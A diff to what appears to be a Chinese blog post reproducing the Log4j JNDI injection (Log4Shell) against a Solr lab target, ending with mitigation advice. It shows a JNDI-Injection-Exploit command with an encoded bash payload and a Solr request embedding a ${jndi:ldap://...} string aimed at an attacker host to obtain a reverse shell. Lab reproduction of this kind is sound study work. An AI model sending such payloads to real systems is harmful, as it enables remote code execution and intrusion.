@@ -98,13 +98,21 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo, YmFzaCA
 http://192.168.xxx.xxx:8983/solr/admin/cores?action=${jndi:ldap://192.168.xxx.xxx:1389/xxxxxx}
 ~~~
 ![1]({{site.baseurl}}/img-post/l-9.png)
-再次返回kali我们可以看到nc成功反弹shell，但是我这里有一个小问题，就是shell没有反弹回来，查了一下csdn的一个大佬说他也反弹不回来，可能是靶场的问题，我试了好几个端口比如6969，8888都没有成功反弹shell，这个时候已经凌晨2：40了，于是我决定先睡觉（没错我就是懒狗）\
+
+再次返回kali我们可以看到nc成功反弹shell，但是我这里有一个小问题，就是shell没有反弹回来，查了一下csdn的一个大佬说他也反弹不回来，可能是靶场的问题，我试了好几个端口比如6969，8888都没有成功反弹shell，这个时候已经凌晨2：40了，于是我决定先睡觉（~~没错我就是懒狗~~）
+
 反弹成功的回显是这样的
+
 ![1]({{site.baseurl}}/img-post/l-11.png)
+
 本来到这里就应该结束了，但是我还是发现一个问题，就是在JNDI注入工具上决定了你是黑客大佬还是脚本小子，如果只会用工具，那么小学生都能顺利完成这个漏洞复现（问题是我已经大学了），在JNDI脚本运行上我又出了问题
+
 ![1]({{site.baseurl}}/img-post/l-12.png)
+
 我尝试了一下网上的方法，说是maven打包出现了问题，我照他的方法重新配置了起步依赖，但是没有用，这个事情充分说明了不会编程的hacker就是个伪命题（你给我去学Java、golang）
+
 ![1]({{site.baseurl}}/img-post/l-16.png)
+
 #### 修复建议
 1. 设置log4j2.formatMsgNoLookups=True，相当于直接禁止lookup查询出栈，也就不可能请求到访问到远程的恶意站点
 2. 对包含有"jndi:ldap://"、"jndi:rmi//"这样字符串的请求进行拦截，即拦截JNDI语句来防止JNDI注入
